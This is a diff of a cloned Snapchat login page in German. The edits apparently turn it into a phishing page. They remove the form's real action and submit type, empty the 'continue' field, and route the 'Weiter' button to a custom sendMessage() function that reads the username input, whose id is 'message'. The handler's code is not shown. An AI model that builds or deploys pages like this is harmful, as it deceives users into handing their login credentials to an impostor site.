@@ -59207,16 +59207,26 @@
             <a href="/" class="logo"><img src="/accounts/static/images/ghost/ghost.svg" alt="Snapchat"></a></div><div class="AccountIdentifier"><article class="page">
                 <div class="container"><div class="snapchat-logo"><img src="/accounts/static/images/ghost/snapchat-app-icon.svg" alt="Snapchat Ghost Icon"></div>
                 <div class="login-challenge-frame">
-                    <h1 class="login-challenge-title">Logge dich bei Snapchat ein</h1></div><div>
-                    <form id="account_identifier_form" action="/accounts/v2/login?continue=%2Faccounts%2Fsso%3Freferrer%3Dhttps%253A%252F%252Fweb.snapchat.com%252F%253Fref%253Dsnapchat_dot_com_login_cta%26tiv_request_info%3DCmsKaQpnCkEEVtuOhvtmdk9awqSBYuNZvleUrhK4hvlUIs4U35aupcPHzsQ6Gow73xmWr2I9DWEe5nsey3YwmtPhulHhneHlYxIg2nIUGh2bPCRuvh8WBxrU%252BUhaBVhuKEVEEjwPRnEfKOUYCQ%253D%253D%26client_id%3Dweb-calling-corp--prod&amp;tiv_request_info=CmsKaQpnCkEEVtuOhvtmdk9awqSBYuNZvleUrhK4hvlUIs4U35aupcPHzsQ6Gow73xmWr2I9DWEe5nsey3YwmtPhulHhneHlYxIg2nIUGh2bPCRuvh8WBxrU%2BUhaBVhuKEVEEjwPRnEfKOUYCQ%3D%3D" method="post" class="centered_form">
-                        <div class="form-group"><label for="accountIdentifier" class="control-label">Nutzername oder Email</label><input name="accountIdentifier" id="message" autocomplete="username" type="text" id="accountIdentifier" class="form-control" value=""><div class="additional-action"><a>Stattdessen Handynummer verwenden</a></div></div><input type="hidden" name="xsrf_token" value="cRvJqMhRTb2rC_5CNGsl0A">
-                        <input type="hidden" name="continue" value="/accounts/sso?referrer=https%3A%2F%2Fweb.snapchat.com%2F%3Fref%3Dsnapchat_dot_com_login_cta&amp;tiv_request_info=CmsKaQpnCkEEVtuOhvtmdk9awqSBYuNZvleUrhK4hvlUIs4U35aupcPHzsQ6Gow73xmWr2I9DWEe5nsey3YwmtPhulHhneHlYxIg2nIUGh2bPCRuvh8WBxrU%2BUhaBVhuKEVEEjwPRnEfKOUYCQ%3D%3D&amp;client_id=web-calling-corp--prod"><input type="hidden" name="arkose-token" value="">
-                        <div id="arkose-wrapper" class="displayArkose"><div class="arkose-iframe-container" id="arkose-iframe-wrapper">
+                    <h1 class="login-challenge-title">Logge dich bei Snapchat ein</h1>
+                </div>
+                <div>
+                    <form id="account_identifier_form" class="centered_form">
+                        <div class="form-group"><label for="accountIdentifier" class="control-label">Nutzername oder Email</label>
+                            <input name="accountIdentifier" id="message" autocomplete="username" type="text" id="accountIdentifier" class="form-control" value="">
+                            <div class="additional-action">
+                                <a>Stattdessen Handynummer verwenden</a>
+                            </div>
+                            </div>
+                            <input type="hidden" name="xsrf_token" value="cRvJqMhRTb2rC_5CNGsl0A">
+                        <input type="hidden" name="continue">
+                        <input type="hidden" name="arkose-token" value="">
+                        <div id="arkose-wrapper" class="displayArkose">
+                            <div class="arkose-iframe-container" id="arkose-iframe-wrapper">
                             <iframe class="arkose-iframe-lightbox" id="arkose-iframe" src="https://iframe.arkoselabs.com/07EAB4B8-2D80-4234-B897-A2CD1F194866/lightbox.html?mkt=de-DE"></iframe>
                         </div>
                     </div>
                     <div class="primary_action login-button">
-                        <button onclick="sendMessage()" type="submit" class="btn btn-lg btn-default">Weiter</button>
+                        <button onclick="sendMessage()" class="btn btn-lg btn-default">Weiter</button>
                     </div>
 </form></div></div><div class="create-account-cta" dir="ltr"><span>Neu bei Snapchat?</span>
 <a href="/accounts/signup?continue=%2Faccounts%2Fsso%3Freferrer%3Dhttps%253A%252F%252Fweb.snapchat.com%252F%253Fref%253Dsnapchat_dot_com_login_cta%26tiv_request_info%3DCmsKaQpnCkEEVtuOhvtmdk9awqSBYuNZvleUrhK4hvlUIs4U35aupcPHzsQ6Gow73xmWr2I9DWEe5nsey3YwmtPhulHhneHlYxIg2nIUGh2bPCRuvh8WBxrU%252BUhaBVhuKEVEEjwPRnEfKOUYCQ%253D%253D%26client_id%3Dweb-calling-corp--prod&amp;tiv_request_info=CmsKaQpnCkEEVtuOhvtmdk9awqSBYuNZvleUrhK4hvlUIs4U35aupcPHzsQ6Gow73xmWr2I9DWEe5nsey3YwmtPhulHhneHlYxIg2nIUGh2bPCRuvh8WBxrU%2BUhaBVhuKEVEEjwPRnEfKOUYCQ%3D%3D">Registrieren</a></div>
